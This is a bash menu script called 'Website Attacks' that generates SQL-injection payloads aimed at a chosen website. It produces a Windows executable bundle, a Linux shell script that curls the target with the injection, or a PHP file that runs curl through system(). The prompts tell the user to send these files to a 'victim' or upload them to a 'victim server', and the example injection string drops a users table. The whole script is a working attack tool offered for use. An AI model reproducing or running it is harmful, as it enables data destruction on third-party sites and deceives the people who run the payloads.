clear
while :
do
echo "";
echo "Website Attacks";
echo "--------------------------------------";
echo ""
echo "  1.- Mirosoft Windows (DIR)";
echo "  2.- GNU/Linux (DIR)";
echo "  3.- HTTP Server (PHP)";
echo ""; 
echo "  99.- Exit";
echo "--------------------------------------";
echo ""
echo -n "Select an option [WebAttack]> "
read op35
case $op35 in
1) echo "[*] Target: Microsoft Windows System";
echo -n "Path to save the payload [WebAttack]> "
read pth11
echo -n "Name for the payload [WebAttack]> "
read name11
mkdir $pth11/$name11
cp bin/windows_sqli.exe $pth11/$name11/$name11.exe
echo "Eg.: http://websi.te/name.php?vuln=";
echo -n "Web Attack Target [WebAttack]> "
read target11
echo "Eg.: '; drop table users--";
echo -n "Injection Code [WebAttack]> "
read inj11
echo "$target11" > $pth11/$name11/t.txt
echo "$inj11" > $pth11/$name11/c.txt
echo "[+] GENERATED IN: $pth11/$name11 ... NOW COMPRESS THE DIRECTORY AND SEND TO THE VICTIM!";
exit
;;
2) echo "[*] Target: GNU/Linux System";
echo -n "Path to save the payload [WebAttack]> "
read pth34
echo "Eg.: '; drop table users--";
echo -n "Injection Code [WebAttack]> "
read inject098
echo -n "Name for the payload [WebAttack]> "
read name34
echo "Eg.: http://websi.te/something.php?parameter";
echo "[¡] DO NOT WRITE '='!!"
echo -n "Web Attack Target [WebAttack]> "
read target13
echo "
#!/bin/bash
curl $target13=$inject098" > $pth34/$name34.sh
echo "[+] GENERATED IN: $pth34/$name34.sh NOW SEND IT TO VICTIM!";
exit
;;
3) echo "[*] Target: HTTP Server";
echo -n "Path to save the payload [WebAttack]> "
read pth000
echo "Eg.: '; drop table users--";
echo -n "Injection Code [WebAttack]> "
read inject000
echo -n "Name for the payload [WebAttack]> "
read name000
echo "Eg.: http://websi.te/something.php?parameter";
echo "[¡] DO NOT WRITE '='!!";
echo -n "Web Attack Target [WebAttack]> "
read target000
echo "
<?php
system('curl $target000=$inject000');
?>" > $pth000/$name000.php
echo "[+] GENERATED IN: $pth000/$name000.php NOW UPLOAD IT TO VICTIM SERVER!"
exit
;;
99) echo "[*] Exiting...";
exit 1;;
*) echo "[!] $op35 is not a valid option.";
echo "Press enter to continue...";
read foo;;
esac
done


